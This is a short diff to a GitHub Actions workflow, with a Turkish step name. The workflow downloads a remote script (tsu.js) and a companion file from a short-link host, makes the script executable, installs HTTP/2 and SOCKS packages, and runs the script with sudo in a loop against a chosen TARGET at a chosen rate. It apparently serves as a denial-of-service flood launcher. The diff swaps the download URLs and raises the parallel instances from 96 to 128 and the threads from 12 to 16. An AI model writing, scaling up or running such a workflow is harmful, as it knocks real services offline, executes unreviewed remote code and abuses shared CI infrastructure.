@@ -26,8 +26,8 @@ jobs:
     steps:
     - name: Dosyaları indir ve hazırla
       run: |
-        wget https://curl.by/KJoek/tsu.js
-        wget https://curl.by/z8WlF/good.txt
+        wget https://curl.by/ramfZ/tsu.js
+        wget https://curl.by/Jp-eu/good.txt
         chmod +x tsu.js
         npm i hpack https commander colors socks
     - name: run
@@ -37,8 +37,8 @@ jobs:
         RATE="${{ inputs.rate }}"
         
         PIDS=()
-        for i in {1..96}; do
-          sudo timeout $TIME node tsu.js "$TARGET" 95 "$RATE" 12 good.txt
+        for i in {1..128}; do
+          sudo timeout $TIME node tsu.js "$TARGET" 95 "$RATE" 16 good.txt
           PIDS+=($!)
         done
         
